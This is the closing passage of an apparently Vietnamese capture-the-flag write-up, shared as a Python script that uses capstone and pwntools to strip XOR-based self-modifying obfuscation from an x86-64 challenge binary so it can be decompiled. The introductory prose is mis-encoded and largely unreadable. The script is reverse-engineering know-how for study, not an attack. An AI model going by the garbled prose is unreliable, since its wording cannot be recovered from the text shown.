<p>Sau khi m√¨nh ƒë·ªçc writeup ch√≠nh th·ª©c, c√≥ v·∫ª nh∆∞ c√≥ h·∫≥n m·ªôt script ƒë·ªÉ deobfuscating file n√†y, v√† d√πng IDA decompile ƒë∆∞·ª£c lu√¥n :(. Vi·ªác n√†y s·∫Ω gi√∫p c√¥ng vi·ªác ph√¢n t√≠ch d·ªÖ h∆°n r·∫•t nhi·ªÅu l·∫ßn ( so v·ªõi ng·ªìi ƒë·ªçc full asm nh∆∞ m√¨nh ). M√¨nh s·∫Ω ƒë·ªÉ script b√™n d∆∞·ªõi cho m·ªçi ng∆∞·ªùi d√πng ( hy v·ªçng m·ªçi ng∆∞·ªùi d√πng n√≥ thay v√¨ c·ªë ƒë·ªçc h·∫øt code asm sinh ra t·ª´ script tr√™n kia). C√≤n l·∫°i logic c·ªßa ch∆∞∆°ng tr√¨nh v·ªÅ c∆° b·∫£n v·∫•n gi·ªëng b√™n tr√™n m√¨nh ƒë√£ tr√¨nh b√†y.</p>
<pre tabindex="0"><code>from pwn import *
import capstone
import sys
import ctypes

def xor(a, b):
    return bytes([a ^ b for a, b in zip(a, b)])

def disas_single(data):
    disas = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_64)
    inst = next(disas.disasm(data, 0))
    return inst, inst.size, inst.mnemonic

def deobufscate(elf, code, text_off, text_end, addr, modified):
    stop = False
    while not stop:
        inst, sz, mneumonic = disas_single(code[addr:])
        if mneumonic == &#39;ret&#39;:
            stop = True
        elif mneumonic == &#39;call&#39;:
            call_dst = addr + ctypes.c_int64(int(inst.op_str, 16)).value
            if call_dst &gt;= text_off and call_dst &lt;= text_end:
                deobufscate(elf, code, text_off, text_end, call_dst, modified)
        elif mneumonic == &#39;xor&#39;:
            if &#39;[rip + &#39; in inst.op_str:
                rip_rel = int(inst.op_str.split(&#39;[rip + &#39;)[1].split(&#39;]&#39;)[0], 16)
                key = int(inst.op_str.split(&#39;,&#39;)[1], 16)
                decrypt = b&#39;&#39;
                if inst.op_str.startswith(&#39;qword ptr &#39;):
                    decrypt = xor(p64(key), code[addr + sz + rip_rel: addr + sz + rip_rel + 8])
                elif inst.op_str.startswith(&#39;dword ptr &#39;):
                    decrypt = xor(p32(key), code[addr + sz + rip_rel: addr + sz + rip_rel + 4])
                elif inst.op_str.startswith(&#39;word ptr &#39;):
                    decrypt = xor(p16(key), code[addr + sz + rip_rel: addr + sz + rip_rel + 2])
                elif inst.op_str.startswith(&#39;byte ptr &#39;):
                    decrypt = xor(p8(key), code[addr + sz + rip_rel: addr + sz + rip_rel + 1])
                assert(len(decrypt) in [1, 2, 4, 8])
                for i, b in enumerate(decrypt):
                    modified[addr + sz + rip_rel + i] = b
                for i in range(addr, addr + sz):
                    modified[i] = 0x90
                if code[addr - 0x1] == 0x9c:
                    modified[addr - 0x1] = 0x90
                if code[addr + sz] == 0x9d:
                    modified[addr + sz] = 0x90
            elif &#39;[rip -&#39; in inst.op_str:
                for i in range(addr, addr + sz):
                    modified[i] = 0x90
                if code[addr - 0x1] == 0x9c:
                    modified[addr - 0x1] = 0x90
                if code[addr + sz] == 0x9d:
                    modified[addr + sz] = 0x90
            code = bytes(modified)
        addr += sz


if __name__ == &#39;__main__&#39;:
    if len(sys.argv) != 3:
        print(f&#39;{sys.argv[0]} obfuscated main_offset&#39;)
        exit(1)
    elf = ELF(sys.argv[1])
    main = int(sys.argv[2], 16)
    text_off = elf.get_section_by_name(&#39;.text&#39;).header.sh_offset
    text_end = elf.get_section_by_name(&#39;.text&#39;).header.sh_offset + elf.get_section_by_name(&#39;.text&#39;).header.sh_size
    sz = text_off + text_end
    with open(elf.path, &#39;rb&#39;) as f:
        full = f.read()
    data = full[:sz]
    modified = bytearray(data)
    deobufscate(elf, data, text_off, text_end, main, modified)
    with open(f&#39;{elf.path}_deobfuscate&#39;, &#39;wb&#39;) as f:
        f.write(bytes(modified) + full[sz:])
</code></pre>]]></description>
</item>
</channel>
</rss>
